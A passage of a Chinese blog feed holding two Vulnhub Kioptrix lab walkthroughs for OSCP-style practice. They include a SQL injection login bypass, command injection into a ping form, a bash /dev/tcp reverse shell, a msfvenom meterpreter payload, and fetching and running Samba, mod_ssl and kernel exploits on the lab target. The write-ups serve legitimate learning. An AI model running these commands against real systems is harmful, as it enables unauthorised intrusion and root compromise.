(VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure></div><p><strong>看到了web服务：80端口和443端口</strong></p><ul><li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05"></p><ul><li>F12 查看源代码</li></ul><img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;"><p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p><h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p><h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul><li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p></li><li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p><ul><li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li></ul></li><li><p>成功后看到以下页面：</p></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22"></p><h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul><li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17"></p><ul><li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46"></p><p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p><p><strong>证明确实存在RCE</strong></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote><p>参考 <a class="link" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul><li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p></li><li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38"></p><p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p><h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote><p>参考<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure></div><h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote><p>参考 <a class="link" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul><li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li></ul><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure></div><p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56"></p><p><strong>发现Linux版本是CentOS 4.5</strong></p><ul><li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li></ul><blockquote><p>关于工具使用：<a class="link" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul><li><code>searchsploit CentOS 4.5</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18"></p><ul><li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li></ul><h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure></div><ul><li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57"></p><ul><li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18"></p><p>==<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>==</p><ul><li>同时在攻击机上也可以看到靶机的信息</li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41"></p><h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul><li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p></li><li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p></li><li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p></li><li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p></li></ul><h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15"></p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote><p>优秀总结：<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul><li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li></ul><h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul><li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li></ul><h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul><li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p></li><li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p><ul><li>LinEnum 可以枚举信息</li><li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li></ul><p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p></li><li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p></li></ul><h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul><li>Python建立简单http服务</li><li>在攻击机中开启apache</li></ul><h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul><li>sql注入知识（<strong>有待进一步学习</strong>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 类OSCP靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix Level 1</title>
      <link href="/2024/01/29/Kioptrix_Level_1/"/>
      <url>/2024/01/29/Kioptrix_Level_1/</url>
      
        <content type="html"><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h1><blockquote><p>参考 <a class="link" href="https://www.cnblogs.com/jarwu/p/17240815.html">Walkthrough-KIOPTRIX LEVEL1 - Jarwu - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>nmap扫描附近存活主机ip</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn xxxx </span><br></pre></td></tr></table></figure></div><p><strong>拿到目标ip为<code>192.168.89.132</code></strong></p><ul><li>nmap扫描端口</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p- -T4 xxxx</span><br></pre></td></tr></table></figure></div><p>-sV 列举出端口使用协议或服务的版本信息</p><p>-p- 扫描全端口</p><p>-T4 设置线程数 <code>加快扫描速度</code></p><p><strong>开放端口信息：</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 08:00 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.132)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: XMYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:A6:90:BB (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds</span><br></pre></td></tr></table></figure></div><h3 id="思路1——Samba-139端口"><a href="#思路1——Samba-139端口" class="headerlink" title="思路1——Samba 139端口"></a>思路1——Samba 139端口</h3><h4 id="查询Samba版本"><a href="#查询Samba版本" class="headerlink" title="查询Samba版本"></a>查询Samba版本</h4><ul><li><p>三种工具：<code>enum4linux</code>、<code>smbclient</code>、<code>metasploit</code></p><ul><li>smbclient -L=<ip></ip></li></ul></li><li><p>这里使用metasploit的Auxiliary模块</p></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41"></p><ul><li>设置RHOSTS <strong>得到smb版本：2.2.1a</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32"></p><p>==注意：oscp中不允许使用msf，这里仅供学习==</p><h4 id="寻找exploit"><a href="#寻找exploit" class="headerlink" title="寻找exploit"></a>寻找exploit</h4><ul><li>工具：<code>searchsploit</code></li><li>用searchsploit 查找：<code>searchsploit Samba 2.2.1a</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16"></p><p><strong>发现存在trans2open Overflow的漏洞</strong></p><ul><li><p>在github中找到了脚本：<a class="link" href="https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c">https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>事实证明，searchsploit里面自己存的multiple/remote/10.c 脚本也可以用，需要使用命令：<code>searchsploit -m multiple/remote/10.c</code>，复制到当前目录</p></li></ul><h4 id="编译和运行脚本"><a href="#编译和运行脚本" class="headerlink" title="编译和运行脚本"></a>编译和运行脚本</h4><h5 id="github脚本"><a href="#github脚本" class="headerlink" title="github脚本"></a>github脚本</h5><ul><li><p>编译：<code>gcc trans2open.c -o trans2open </code></p></li><li><p>运行：<code>./trans2open</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic</span><br><span class="line">Connect back method, Xnuxer-Labs, 2003.</span><br><span class="line">Usage  : ./trans2open &lt;type&gt; &lt;victim&gt; &lt;your_ip&gt;</span><br><span class="line">Targets:</span><br><span class="line">         0 = Linux</span><br><span class="line">         1 = FreeBSD/NetBSD</span><br><span class="line">         2 = OpenBSD 3.0 and prior</span><br><span class="line">         3 = OpenBSD 3.2 - non-exec stack</span><br></pre></td></tr></table></figure></div></li><li><p>根据提示：<code>./trans2open 0 192.168.89.132 192.168.89.137 </code></p></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28"></p><h5 id="searchsploit自带脚本"><a href="#searchsploit自带脚本" class="headerlink" title="searchsploit自带脚本"></a>searchsploit自带脚本</h5><ul><li><p>编译</p></li><li><p>运行</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)                                                                  </span><br><span class="line">--------------------------------------------------------------                                                                  </span><br><span class="line">Usage: ./10 [-bBcCdfprsStv] [host]                                                                                              </span><br><span class="line">                                                                                                                                </span><br><span class="line">-b    bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)                          </span><br><span class="line">-B        bruteforce steps (default = 300)                                                                                </span><br><span class="line">-c  connectback ip address                                                                                          </span><br><span class="line">-C  max childs for scan/bruteforce mode (default = 40)                                                              </span><br><span class="line">-d       bruteforce/scanmode delay in micro seconds (default = 100000)                                                   </span><br><span class="line">-f              force                                                                                                           </span><br><span class="line">-p        port to attack (default = 139)                                                                                  </span><br><span class="line">-r         return address                                                                                                  </span><br><span class="line">-s              scan mode (random)                                                                                              </span><br><span class="line">-S     scan mode                                                                                                       </span><br><span class="line">-t        presets (0 for a list)                                                                                          </span><br><span class="line">-v              verbose mode     </span><br></pre></td></tr></table></figure></div></li><li><p>根据提示：<code>./10 -b 0 192.168.89.132</code></p></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37"></p><h3 id="思路2-——mod-ssl-2-8-4-端口443"><a href="#思路2-——mod-ssl-2-8-4-端口443" class="headerlink" title="思路2 ——mod_ssl/2.8.4 端口443"></a>思路2 ——mod_ssl/2.8.4 端口443</h3><h4 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h4><p>这里nmap把版本写的很清楚：443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p><h4 id="寻找exploit-1"><a href="#寻找exploit-1" class="headerlink" title="寻找exploit"></a>寻找exploit</h4><ul><li><code>searchsploit mod_ssl 2.8.4</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13"></p><p><strong>挑选一个数值更大的文件：47080.c</strong></p><ul><li><code>searchsploit -x unix/remote/47080.c</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09"></p><p><strong>仔细看注释，里面写了requirements和编译命令</strong></p><h4 id="编译和运行脚本-1"><a href="#编译和运行脚本-1" class="headerlink" title="编译和运行脚本"></a>编译和运行脚本</h4><p>这个步骤其实就是根据提示补全命令，运行脚本后，可以直接拿到root（理论上）。</p><p>事实上，我尝试了很久，大概在七八次的时候才拿到root（碰运气）</p><p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06"></p><p>在此之前都是拿到一个普通用户apache的权限，因此，我学习了一些提权知识，详见<code>学习总结——关于Linux提权</code>。</p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><h3 id="关于Samba"><a href="#关于Samba" class="headerlink" title="关于Samba"></a>关于Samba</h3><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。Samba 是能够在任何支持 SMB 协议的主机之间共享文件的一种实现，当然也包括 windows。SMB 是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB 协议是 C/S 型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。</p><h3 id="关于MSF的Auxiliary"><a href="#关于MSF的Auxiliary" class="headerlink" title="关于MSF的Auxiliary"></a>关于MSF的Auxiliary</h3><p>auxiliary 本身意思为辅助的</p><p>在msf中代表辅助探测模块：该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p><p><strong>本次渗透测试用于查询smb服务版本</strong></p><h3 id="关于Linux-提权（部分）"><a href="#关于Linux-提权（部分）" class="headerlink" title="关于Linux 提权（部分）"></a>关于Linux 提权（部分）</h3><p>此处是因为一点小bug，脚本在运行的时候wget不稳定，导致提权脚本没拉到本地，因此没有成功，只有一个普通用户的权限。</p><p>在遇到这个问题的时候，我顺便学习了一点提权知识：</p><ul><li>利用linux内核版本信息（uname -a在靶机上查看），然后在攻击机上搜索exploit</li><li>通过爆破脚本，暴力破解root密码</li></ul><p>但提权过程基本是：<strong>寻找exploit或相关脚本，通过在攻击机上开启apache服务，将脚本上传到/var/www/html之中，然后靶机通过wget http://攻击机ip/目标脚本 拿到本地执行</strong></p>]]></content>
      
      
      <categories>
          
          <category> 类OSCP靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
